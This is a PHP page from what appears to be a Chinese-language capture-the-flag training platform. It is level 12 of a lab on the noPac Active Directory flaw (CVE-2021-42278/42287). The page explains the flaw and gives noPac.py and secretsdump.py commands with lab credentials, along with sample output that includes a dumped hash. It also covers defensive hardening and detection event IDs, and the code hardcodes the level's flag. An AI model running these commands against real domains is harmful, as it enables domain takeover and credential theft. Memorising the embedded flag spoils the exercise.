<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 12: noPac (CVE-2021-42278/42287) & Advanced Kerberos Attacks
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 300, '');
$ACTIVE[230] = 'active open';
$ACTIVE[232] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{GOAD_noPac_sAMAccountName_Impersonation_DC_2026}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag12'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第十二关：noPac 欺骗与高级 Kerberos】成就 (+350 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查提取的凭据或分析过程。</div>';
    }
}
?>

<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="font-size: 14px; border-radius: 6px;">LEVEL 12</span>
                            第十二关：noPac (CVE-2021-42278 / 42287) 欺骗与高级 Kerberos 漏洞
                        </h1>
                        <div style="color: var(--text-secondary); font-size: 14px;">
                            350 PTS · 主题：sAMAccountName 名称混淆、Kerberos TGT/TGS 伪造、KrbRelayUp 与 Certifried (CVE-2022-26923)
                        </div>
                    </div>
                    <div>
                        <a href="ad_ctf_coerce.php" class="btn btn-sm btn-default"><i class="fa fa-arrow-left"></i> 上一关</a>
                        <a href="ad_ctf_domain_trust.php" class="btn btn-sm btn-primary">下一关 <i class="fa fa-arrow-right"></i></a>
                    </div>
                </div>
            </div>

            <?php echo $flag_msg; ?>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-user-secret" style="color: #ef4444;"></i> Step 1: noPac (sAMAccountName 欺骗) 组合漏洞原理拆解</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    <b>【原理分析】</b> noPac 漏洞由两个 CVE 组合而成：
                    1. <b>CVE-2021-42278</b>：Active Directory 默认允许普通域用户创建最多 10 个计算机账号（<code>ms-DS-MachineAccountQuota = 10</code>），且允许修改计算机账号的 <code>sAMAccountName</code> 属性（如将其改名去除结尾的 <code>$</code> 符号，改为 <code>GOAD-DC01</code>）。<br>
                    2. <b>CVE-2021-42287</b>：当 Kerberos KDC 收到没有 <code>$</code> 的服务票据请求（TGS-REQ）且找不到对应的账户时，KDC 会自动在名字末尾追加一个 <code>$</code> 并重新搜索，从而错误地以域控制器（如 <code>GOAD-DC01$</code>）的上下文签发高权 PAC 认证票据！
                </p>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-terminal" style="color: #6366f1;"></i> Step 2: 使用 noPac / sam_the_admin 工具实战伪造 DC TGT 并接管域控</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    在 GOAD 靶场环境（域 <code>sevenkingdoms.local</code>），攻击者通过低权用户凭据直接运行 noPac 自动化利用脚本：
                </p>
                <div class="cmd-box">
# 使用 noPac / sam_the_admin 自动化验证并生成域控 Ticket
python3 noPac.py sevenkingdoms.local/tywin.lannister:Password123! -dc-ip 192.168.56.10 -m -dump

# 或使用 Impacket / Mimikatz 提取 DCSync 密码 Hash
secretsdump.py sevenkingdoms.local/tywin.lannister:Password123!@192.168.56.10 -use-no-pac
                </div>
                <div class="output-box">
[*] Attacking Domain Controller: GOAD-DC01.sevenkingdoms.local
[*] Created Machine Account: FAKE_COMPUTER$
[*] Modified sAMAccountName from FAKE_COMPUTER$ to GOAD-DC01
[*] Requesting Ticket-Granting Ticket (TGT) without PAC...
[*] Restored sAMAccountName back to FAKE_COMPUTER$
[*] Requesting S4U2self TGS Ticket impersonating Domain Admin (Administrator)...
[+] Successfully impersonated Administrator! Ticket saved to GOAD-DC01.ccache
[*] Executing DCSync against 192.168.56.10...
Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] Flag: flag{GOAD_noPac_sAMAccountName_Impersonation_DC_2026}
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-bug" style="color: #f59e0b;"></i> Step 3: 其他高危 Kerberos & 核心漏洞拓展 (Certifried & KrbRelayUp)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    1. <b>Certifried (CVE-2022-26923)</b>：修改新建机器账户的 <code>dNSHostName</code> 属性为域控 FQDN，向 ADCS 申请包含该 DNS 的证书，利用证书直接完成跨域/域控提权。<br>
                    2. <b>KrbRelayUp</b>：结合 Shadow Credentials、RBCD 与 Kerberos 本地 Loopback Relay，在无需 Domain Admin 协助下完成本地 SYSTEM 提权。
                </p>
            </div>

            <!-- Step 4 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-shield" style="color: #10b981;"></i> Step 4: 防御加固与安全审计 Event ID</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    1. <b>修改 MachineAccountQuota 策略</b>：将域属性 <code>ms-DS-MachineAccountQuota</code> 强制修改为 <code>0</code>，阻止普通域用户任意创建机器账户。<br>
                    2. <b>部署 KB5008380 / KB5008602 安全补丁</b>：开启强制 PAC 属性校验与身份映射匹配。
                </p>
                <div class="cmd-box">
# 使用 Active Directory PowerShell 模块将配额调整为 0
Set-ADDomain -Identity sevenkingdoms.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
                </div>
                <table class="table table-bordered table-striped" style="font-size: 13px; color: var(--text-primary); margin-top: 15px;">
                    <thead>
                        <tr style="background: var(--bg-secondary);">
                            <th>Event ID</th>
                            <th>日志类型</th>
                            <th>异常捕获特征</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>4741</strong></td>
                            <td>计算机账户创建</td>
                            <td>捕获到普通域用户在非预期的终端创建了新的计算机账号 (SubjectName 为普通域用户)。</td>
                        </tr>
                        <tr>
                            <td><strong>4742</strong></td>
                            <td>计算机账户修改</td>
                            <td>捕获到计算机账号的 <code>sAMAccountName</code> 属性修改，且新名字移除了结尾的 <code>$</code> 符号或匹配已有的 DC 命名。</td>
                        </tr>
                        <tr>
                            <td><strong>4769</strong></td>
                            <td>Kerberos 服务票据申请</td>
                            <td>捕获到无 PAC 的服务票据请求 (Ticket Options: <code>0x40810000</code>)，提示无 PAC 票据伪造。</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Flag Submission Box -->
            <div class="flag-box">
                <h4 style="margin-top:0; font-weight:800; color:var(--text-primary); margin-bottom:12px;">
                    <i class="fa fa-flag" style="color:#ef4444;"></i> 提交第十二关 Flag
                </h4>
                <form method="POST">
                    <div class="form-group" style="margin-bottom:14px;">
                        <label style="font-size:13px; color:var(--text-secondary);">填入从 noPac & SAM 欺骗漏洞实验中获取的 Flag：</label>
                        <input type="text" name="user_flag" class="form-control" style="border-radius:8px; background:var(--bg-secondary); color:var(--text-primary); border:1px solid var(--border-color); padding:10px 14px; font-family:monospace;" placeholder="flag{...}" required>
                    </div>
                    <button type="submit" name="check_flag" class="btn btn-primary btn-block" style="border-radius:8px; background:linear-gradient(135deg, #ef4444, #dc2626); border:none; padding:10px; font-weight:700;">
                        提交并验证 Flag (+350 PTS)
                    </button>
                </form>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
